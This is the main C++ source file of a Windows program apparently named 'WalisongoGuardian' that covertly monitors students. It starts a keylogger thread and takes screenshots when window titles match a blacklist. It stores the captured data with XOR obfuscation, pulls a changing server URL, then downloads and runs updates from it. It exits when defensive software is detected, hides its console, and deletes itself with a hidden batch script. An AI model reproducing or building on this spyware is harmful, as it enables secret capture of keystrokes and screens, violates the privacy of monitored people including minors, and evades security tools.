#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

// Windows Headers
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <filesystem>
#include <algorithm>
#include <mutex>
#include <condition_variable>
#include <wininet.h> 
#include <rpc.h>
#include <shlobj.h>
#include <gdiplus.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdiplus.lib") 

using namespace std;
namespace fs = std::filesystem;

// Include Core Modules
#include "core/globals.h"
#include "core/config.h"
#include "core/utils.h"
#include "core/encryption.h"
#include "core/system_monitor.h"
#include "core/keylogger.h"
#include "core/transmission.h"
#include "core/updater.h"
#include "core/persistence.h"
#include "core/network_gate.h" 
#include "core/active.h"
#include "core/wifi_filter.h"

// --- Prototipe Fungsi & Variabel Global ---
time_t lastLinkCheck = 0;
int connectionFailCount = 0; 
const int MAX_SLEEP_TIME = 1800; // Maksimal 30 menit (1800 detik)

bool FetchLatestLink(); 
void ExecuteUpdateCheck(HANDLE hMutex);

// Helper untuk mengekstrak nilai JSON yang lebih tangguh terhadap spasi
string GetJsonValue(const string& json, const string& key) {
    size_t keyPos = json.find("\"" + key + "\"");
    if (keyPos == string::npos) return "";
    
    size_t startPos = json.find(":", keyPos);
    if (startPos == string::npos) return "";
    
    size_t quoteStart = json.find("\"", startPos);
    if (quoteStart == string::npos) return "";
    
    size_t quoteEnd = json.find("\"", quoteStart + 1);
    if (quoteEnd == string::npos) return "";
    
    return json.substr(quoteStart + 1, quoteEnd - quoteStart - 1);
}

void ExecuteUpdateCheck(HANDLE hMutex) {
    try {
        // Pastikan link tersedia sebelum mengecek
        if (Config::DYNAMIC_SERVER_URL.empty()) {
            bool success = FetchLatestLink();
            if (!success) {
                connectionFailCount++;
                return;
            } else {
                connectionFailCount = 0; // Reset jika berhasil
            }
        }
        
        string baseUrl = Config::DYNAMIC_SERVER_URL;
        
        // Buang path /upload jika ada agar tidak salah endpoint
        size_t uploadPos = baseUrl.find("/upload");
        if (uploadPos != string::npos) baseUrl = baseUrl.substr(0, uploadPos);
        if (!baseUrl.empty() && baseUrl.back() == '/') baseUrl.pop_back();

        string checkUrl = baseUrl + "/check-update";
        string downloadUrl = baseUrl + "/get-update";

        HINTERNET hInt = InternetOpenA("WalisongoGuardian/1.5", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInt) {
            string headers = "X-API-Key: " + Config::RAW_API_KEY + "\r\n" +
                             "X-Client-Version: " + Config::CLIENT_VERSION + "\r\n";
            
            DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
            if (baseUrl.find("https://") == 0) flags |= INTERNET_FLAG_SECURE;

            HINTERNET hConnect = InternetOpenUrlA(hInt, checkUrl.c_str(), headers.c_str(), (DWORD)headers.length(), flags, 0);
            
            if (hConnect) {
                char buffer[2048] = {0}; DWORD read;
                if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &read)) {
                    string response(buffer);
                    string sHash = GetJsonValue(response, "latest_hash");
                    
                    wchar_t myPath[MAX_PATH]; 
                    GetModuleFileNameW(NULL, myPath, MAX_PATH);
                    
                    if (!sHash.empty() && sHash != "not_found" && sHash != "error") {
                        if (GetFileSHA256(myPath) != sHash) {
                            fs::path currentPath(myPath);
                            wstring newExe = (currentPath.parent_path() / L"upd_tmp.exe").wstring();
                            
                            if (DownloadNewVersion(downloadUrl, newExe)) {
                                if (GetFileSHA256(newExe) == sHash) {
                                    InternetCloseHandle(hConnect);
                                    InternetCloseHandle(hInt);
                                    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
                                    ApplyUpdate(newExe); 
                                    exit(0); 
                                } else {
                                    fs::remove(newExe);
                                }
                            }
                        }
                    }
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInt);
        }
    } catch (...) {
        connectionFailCount++;
    }
}

// Fungsi untuk memicu penghapusan diri (Self-Destruct)
void InitiateSelfDestruct() {
    wchar_t myPathRaw[MAX_PATH];
    GetModuleFileNameW(NULL, myPathRaw, MAX_PATH);
    std::filesystem::path targetExe(myPathRaw);
    std::filesystem::path batPath = targetExe.parent_path() / L"kill_worker.bat";

    std::ofstream bat(batPath);
    if (bat.is_open()) {
        bat << "@echo off\n";
        bat << "timeout /t 3 /nobreak > nul\n"; 
        bat << ":RETRY\n";
        bat << "del /f /q \"" << Ws2S(targetExe.wstring()) << "\" >nul 2>&1\n";
        bat << "if exist \"" << Ws2S(targetExe.wstring()) << "\" goto RETRY\n";
        bat << "reg delete \"HKEY_CURRENT_USER\\Software\\SystemMonitor\" /f >nul 2>&1\n";
        bat << "del \"%~f0\"\n"; 
        bat.close();

        ShellExecuteW(NULL, L"open", L"cmd.exe", (L"/c \"" + batPath.wstring() + L"\"").c_str(), NULL, SW_HIDE);
        exit(0);
    }
}

void CheckKillSwitch() {
    time_t now = time(0);
    if (now > Config::EXPIRY_DATE) {
        InitiateSelfDestruct();
    }
}

void ServiceLogic() {
    GetCache("activity");
    GetCache("keylog");
    GetCache("screenshot");
    GetCache("link");

    try {
        wchar_t myPath[MAX_PATH]; GetModuleFileNameW(NULL, myPath, MAX_PATH);
        fs::path dir = fs::path(myPath).parent_path();
        if (fs::exists(dir / "upd_worker.bat")) fs::remove(dir / "upd_worker.bat");
        if (fs::exists(dir / "upd_tmp.exe")) fs::remove(dir / "upd_tmp.exe");
        if (fs::exists(dir / "kill_worker.bat")) fs::remove(dir / "kill_worker.bat");
    } catch(...) {}

    RandomSleep(3, 7); 
    if (IsDefenseActive()) exit(0); 

    HANDLE hMutex = CreateMutexA(NULL, TRUE, Config::MUTEX_ID.c_str());
    if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hMutex) CloseHandle(hMutex);
        return; 
    }

    // 1. Pastikan URL Server sudah didapatkan sebelum menjalankan modul pengiriman
    if (Config::DYNAMIC_SERVER_URL.empty()) {
        FetchLatestLink(); 
    }
    ExecuteUpdateCheck(hMutex);

    HKEY hKey;
    wchar_t n[256] = {0}, c[256] = {0}, id[256] = {0};
    DWORD sz = sizeof(n);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExW(hKey, L"StudentName", NULL, NULL, (BYTE*)n, &sz); sz = sizeof(c);
        RegQueryValueExW(hKey, L"StudentClass", NULL, NULL, (BYTE*)c, &sz); sz = sizeof(id);
        RegQueryValueExW(hKey, L"SystemID", NULL, NULL, (BYTE*)id, &sz);
        STUDENT_NAME = Ws2S(n); STUDENT_CLASS = Ws2S(c); SYSTEM_ID = Ws2S(id);
        RegCloseKey(hKey);
    }

    SetProcessDPIAware(); 
    FreeConsole(); 

    std::thread(KeylogLoop).detach();
    std::thread(WifiFilter::StartMonitoring).detach();

    // 3. Jalankan pemantauan aktif HANYA setelah URL dipastikan siap
    if (!Config::DYNAMIC_SERVER_URL.empty()) {
        ActiveMonitor::StartReactiveMonitoring();
        ActiveMonitor::SendActiveStatus(); 
    }

    string lastWindow = "";
    int loopCounter = 0;

    while (true) {
        try {
            loopCounter++;
            
            if (Config::DYNAMIC_SERVER_URL.empty() || loopCounter % 100 == 0) {
                if(FetchLatestLink()) connectionFailCount = 0;
            }

            if (loopCounter % 50 == 0) {
                ExecuteUpdateCheck(hMutex);
            }

            if (loopCounter % 20 == 0) { 
                CheckKillSwitch(); 
            }
            
            if (loopCounter % 120 == 0) { 
                ActiveMonitor::SendActiveStatus();
            }

            if (loopCounter % 60 == 0) CleanupOldData(); 
            ProcessOfflineQueue(); 

            string currentWin = SystemMonitor::GetActiveWindowTitle();
            string lowerWin = currentWin;
            transform(lowerWin.begin(), lowerWin.end(), lowerWin.begin(), ::tolower); 

            bool detected = false;
            for(auto& b : Config::BLACKLIST) {
                string lowerKeyword = b;
                transform(lowerKeyword.begin(), lowerKeyword.end(), lowerKeyword.begin(), ::tolower);
                if(lowerWin.find(lowerKeyword) != string::npos) { 
                    detected = true; 
                    break; 
                }
            }
            
            if (detected) {
                if (!isKeyloggerRunning || (currentWin != lastWindow && !currentWin.empty())) {
                    isKeyloggerRunning = true;
                    vector<BYTE> ss = SystemMonitor::TakeScreenshot();
                    if (!ss.empty()) {
                        XORData(ss);
                        fs::path p = GetCache("screenshot") / ("ss_" + to_string(time(NULL)) + ".dat");
                        ofstream ofs(p, ios::binary); 
                        if(ofs.is_open()) { ofs.write((char*)ss.data(), ss.size()); ofs.close(); }
                    }
                }
            } else {
                if (isKeyloggerRunning) { 
                    FlushKeylogToDisk(); 
                    isKeyloggerRunning = false; 
                }
            }

            if (currentWin != lastWindow && !currentWin.empty() && detected) {
                string log = "[" + currentWin + "]";
                vector<BYTE> v(log.begin(), log.end());
                XORData(v);
                fs::path p = GetCache("activity") / ("act_" + to_string(time(NULL)) + ".dat");
                ofstream ofs(p, ios::binary); 
                if(ofs.is_open()) { ofs.write((char*)v.data(), v.size()); ofs.close(); }
            }

            if (currentWin != lastWindow) {
                lastWindow = currentWin;
            }

            // --- LOGIKA SLEEP DINAMIS ---
            int sleepSeconds;
            if (connectionFailCount > 0) {
                sleepSeconds = connectionFailCount * 60; 
                if (sleepSeconds > MAX_SLEEP_TIME) sleepSeconds = MAX_SLEEP_TIME;
            } else {
                sleepSeconds = (loopCounter % 15 == 0 ? 10 : 3);
            }

            if (loopCounter > 10000) loopCounter = 0;
            this_thread::sleep_for(chrono::seconds(sleepSeconds));

        } catch(...) { 
            connectionFailCount++;
            this_thread::sleep_for(chrono::seconds(30)); 
        }
    }
}

bool FetchLatestLink() {
    time_t now = time(NULL);
    if (now - lastLinkCheck < 300 && !Config::DYNAMIC_SERVER_URL.empty()) return true;

    fs::path linkDir = GetCache("link"); 
    fs::path linkFile = linkDir / "link.txt";
    
    std::error_code ec;
    if (!fs::exists(linkDir)) fs::create_directories(linkDir, ec);

    string result = FetchExternalLink(""); 
    lastLinkCheck = now;

    if (!result.empty()) {
        result.erase(result.find_last_not_of(" \n\r\t") + 1);
        result.erase(0, result.find_first_not_of(" \n\r\t"));

        if (result.find("http") == 0) {
            if (Config::DYNAMIC_SERVER_URL != result) {
                Config::DYNAMIC_SERVER_URL = result;
                ofstream ofs(linkFile, ios::trunc);
                if (ofs.is_open()) { ofs << result; ofs.close(); }
            }
            return true;
        }
    }

    if (fs::exists(linkFile)) {
        ifstream ifs(linkFile);
        string localLink;
        if (getline(ifs, localLink) && localLink.find("http") == 0) {
            Config::DYNAMIC_SERVER_URL = localLink;
            return true;
        }
    }
    return false;
}

int main(int argc, char* argv[]) {
    bool isBackground = (argc > 1 && string(argv[1]) == "--background");
    
    if (isBackground) {
        ServiceLogic();
        return 0;
    }

    ShowConsole(); 
    Install(); 
    return 0;
}